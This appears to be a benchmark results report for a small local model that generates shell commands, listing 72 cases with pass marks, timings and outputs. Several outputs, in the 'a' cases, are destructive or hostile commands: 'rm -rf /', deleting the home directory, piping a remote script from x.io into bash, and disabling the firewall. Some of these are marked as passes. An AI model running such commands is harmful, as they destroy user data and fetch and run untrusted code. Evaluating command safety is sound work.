# eval: llama-server / Qwen3-0.6B-Q8_0.gguf (qwen3-0.6b)
- mode: schema · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 41/72 (57%)
- cold p50 1035ms p95 1303ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 1291 | - | node -v ; npm -v |
| u02 | ✓ | 913 | - | ls -l |
| u03 | ✗ | 933 | - | ip |
| u04 | ✓ | 1086 | - | netstat -tulnp | grep 3000 |
| u05 | ✗ | 1072 | - | df -h /Users/hridyaagrawal/lexis-eval/lexis |
| u06 | ✗ | 1321 | - | find /Users/hridyaagrawal/lexis-eval/lexis -type f -name '*.log' -mtime +8 -exec |
| u07 | ✗ | 1001 | - | ps -p $(id -u hridyaagrawal) -o pid,cmd |
| u08 | ✓ | 926 | - | git status |
| u09 | ✓ | 864 | - | brew install ripgrep |
| u10 | ✓ | 1170 | - | mkdir projects ; cd projects |
| u11 | ✓ | 1228 | - | tar -czf /Users/hridyaagrawal/lexis-eval/lexis/archive.tar.gz /Users/hridyaagraw |
| u12 | ✗ | 976 | - | grep -A 10 PATH /etc/environment |
| u13 | ✗ | 980 | - | kill -9 <PID> |
| u14 | ✓ | 1034 | - | tail -20 /var/log/syslog |
| u15 | ✓ | 888 | - | which python3 |
| u16 | ✓ | 1211 | - | brew update ; brew list |
| u17 | ✗ | 1035 | - | ls -la /Users/hridyaagrawal |
| u18 | ✗ | 977 | - | git reset --hard HEAD |
| u19 | ✗ | 1201 | - | find /Users/hridyaagrawal -type f -maxdepth 1 -name '*.txt' | sort -nr | head -n |
| u20 | ✓ | 849 | - | free -m |
| u21 | ✗ | 1098 | - | find . -type f -name '*.js' | wc -l |
| u22 | ✓ | 976 | - | sudo systemctl restart docker |
| u23 | ✓ | 1148 | - | chmod +x script.sh ; sh script.sh |
| u24 | ✗ | 1078 | - | grep -r 'TODO' /Users/hridyaagrawal/lexis-eval/lexis |
| u25 | ✗ | 1205 | - | cp https://example.com/file.zip /Users/hridyaagrawal/lexis-eval/lexis/downloads/ |
| u26 | ✗ | 979 | - | cat /proc/cpuinfo |
| u27 | ✓ | 1047 | - | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 1059 | - | rm -rf /Users/hridyaagrawal/lexis-eval/lexis/node_modules |
| u29 | ✓ | 960 | - | netstat -tulnp |
| u30 | ✓ | 965 | - | unzip file.zip |
| u31 | ✗ | 1149 | - | watch -n 10 /Users/hridyaagrawal/lexis-eval/lexis/lexis.log |
| u32 | ✗ | 848 | - | date |
| u33 | ✗ | 1145 | - | find . -type f -name '.*\.zsh\$' -exec ls -l {} 
 |
| u34 | ✗ | 855 | - | dig |
| u35 | ✓ | 986 | - | cp file.txt backup.txt |
| u36 | ✓ | 1023 | - | mv old.txt new.txt |
| u37 | ✗ | 1091 | - | du -sh /Users/hridyaagrawal/lexis-eval/lexis/downloads |
| u38 | ✓ | 873 | - | npm list --global |
| u39 | ✗ | 1046 | - | cd /Users/hridyaagrawal/lexis-eval/lexis |
| u40 | ✗ | 922 | - | sudo kill -HUP 10000 |
| a01 | ✓ | 951 | - | rm -rf /Users/hridyaagrawal/ |
| a02 | ✓ | 1345 | - | sudo fsck /dev/diskX ; sudo reboot |
| a03 | ✗ | 957 | - | git push origin main |
| a04 | ✓ | 1109 | - | curl -o /Users/hridyaagrawal/lexis-eval/lexis/install.sh https://sketchy.example |
| a05 | ✓ | 861 | - | kill -9 * |
| a06 | ✗ | 1134 | - | chmod 777 /Users/hridyaagrawal/lexis-eval/lexis |
| a07 | ✓ | 1171 | - | source /Users/hridyaagrawal/lexis-eval/lexis |
| a08 | ✗ | 1007 | - | wget https://x.io/i |
| a09 | ✓ | 964 | - | chmod 755 /Volumes/MyDrive |
| a10 | ✓ | 1154 | - | find /var/log -type f -mtime +30 -exec rm -rf {}  |
| a11 | ✗ | 1188 | - | ln -s /Users/hridyaagrawal/lexis/lexis/lexis.sh /usr/local/bin/lexis |
| a12 | ✓ | 1017 | - | git reset --hard origin/HEAD |
| a13 | ✗ | 1694 | - | - |
| a14 | ✓ | 1053 | - | sudo firewall-cmd --permanent --disable firewalld |
| a15 | ✓ | 1075 | - | rm -rf /Users/hridyaagrawal/lexis-eval/lexis/temp |
| a16 | ✓ | 1044 | - | rm -rf /Users/hridyaagrawal/lexis-eval/lexis |
| a17 | ✓ | 925 | - | rm -rf /Users/hridyaagrawal |
| a18 | ✗ | 826 | - | zenity-box |
| a19 | ✗ | 910 | - | nano ~/.bashrc |
| a20 | ✓ | 1070 | - | rm -rf / --no-preserve-root |
| u41 | ✗ | 1122 | - | find /Users/hridyaagrawal/home -type f -size +100M |
| u42 | ✓ | 948 | - | touch my notes.txt |
| u43 | ✗ | 1045 | - | git log --oneline --format=%s |
| u44 | ✓ | 1052 | - | curl -s https://example.com |
| u45 | ✓ | 1030 | - | find . -type f | wc -l |
| u46 | ✓ | 873 | - | ip addr show |
| u47 | ✗ | 1039 | - | df -h /Users/hridyaagrawal/lexis-eval/lexis |
| u48 | ✓ | 870 | - | who |
| a21 | ✓ | 1303 | - | crontab -u hridyaagrawal ; rm -rf /tmp |
| a22 | ✓ | 1182 | - | ln -s /Users/hridyaagrawal/.local/share/hosts /etc/hosts |
| a23 | ✓ | 958 | - | rm -rf . |
| a24 | ✗ | 1031 | - | curl https://x.io/i.sh | bash |
